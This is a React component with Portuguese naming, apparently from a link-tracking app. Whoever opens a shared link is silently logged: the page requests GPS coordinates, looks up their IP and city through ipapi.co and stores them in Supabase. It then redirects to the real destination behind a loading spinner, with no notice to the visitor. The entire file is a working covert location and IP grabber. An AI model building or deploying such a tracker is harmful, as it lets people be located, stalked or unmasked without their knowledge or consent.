import React, { useEffect, useState } from 'react';
import { supabase } from '../supabase';

export default function TrackerPage() {
  const [ok, setOk] = useState(false);

  useEffect(() => {
    async function coletar() {
      const id = window.location.pathname.split('/').pop();
      let acesso = {
        ip: 'Unknown',
        loc: 'Unknown',
        data: new Date().toLocaleString('en-US')
      };
      function getAcessoData() {
        if (navigator.geolocation) {
          return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
              pos => {
                acesso.loc = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
                acesso.gps = true;
                fetch('https://ipapi.co/json/')
                  .then(resp => resp.json())
                  .then(data => {
                    acesso.ip = data.ip;
                    resolve();
                  })
                  .catch(() => resolve());
              },
              err => {
                fetch('https://ipapi.co/json/')
                  .then(resp => resp.json())
                  .then(data => {
                    acesso.ip = data.ip;
                    acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
                    acesso.gps = false;
                    resolve();
                  })
                  .catch(() => resolve());
              },
              { timeout: 5000 }
            );
          });
        } else {
          return fetch('https://ipapi.co/json/')
            .then(resp => resp.json())
            .then(data => {
              acesso.ip = data.ip;
              acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
              acesso.gps = false;
            })
            .catch(() => {});
        }
      }
      await getAcessoData();
      // Busca o link pelo id
      const { data, error } = await supabase
        .from('links')
        .select('*')
        .eq('id', id)
        .single();
      if (data) {
        // Atualiza acessos
        const novosAcessos = [...(data.acessos || []), acesso];
        await supabase
          .from('links')
          .update({ acessos: novosAcessos })
          .eq('id', id);
        setTimeout(() => {
          if (data.destino) window.location.href = data.destino;
        }, 1500);
      }
      setOk(true);
    }
    coletar();
  }, []);

  return (
    <div style={{
      minHeight: '100vh',
      background: 'var(--preto-espionagem)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      textAlign: 'center'
    }}>
      <div style={{
        width: 60,
        height: 60,
        border: '6px solid #222',
        borderTop: '6px solid #E60033',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite'
      }} />
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}